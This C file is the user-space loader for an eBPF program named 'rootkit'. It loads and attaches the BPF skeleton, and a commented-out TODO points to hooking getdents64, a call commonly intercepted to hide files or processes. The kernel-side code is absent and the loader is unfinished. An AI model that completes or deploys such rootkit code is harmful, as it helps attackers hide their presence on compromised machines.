#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "common_um.h"
#include "rootkit.skel.h"
#include <bpf/libbpf.h>

int main(int argc, char *argv[]) {
    struct rootkit_bpf *skel;
    int err;

    /* Setup common tasks*/
    if (!setup()) {
        fprintf(stderr, "Failed to do common setup\n");
        return 1;
    };

    /* Open BPF application */
    skel = rootkit_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF skeleton\n");
        return 1;
    }

    /* Load & verify BPF programs */
    err = rootkit_bpf__load(skel);
    if (err) {
        fprintf(stderr, "Failed to load and verify BPF skeleton\n");
        goto cleanup;
    }

    /* Setup maps for tail calls */
    //TODO: continue here at 2025-03-18,come on, you can do it!
    //int index = 1;
    //int prog_fd = bpf_program__fd(skel->progs.handle_getdents64_enter);

    /* Attach tracepoint handler */
    err = rootkit_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton\n");
        goto cleanup;
    }

cleanup:
    rootkit_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
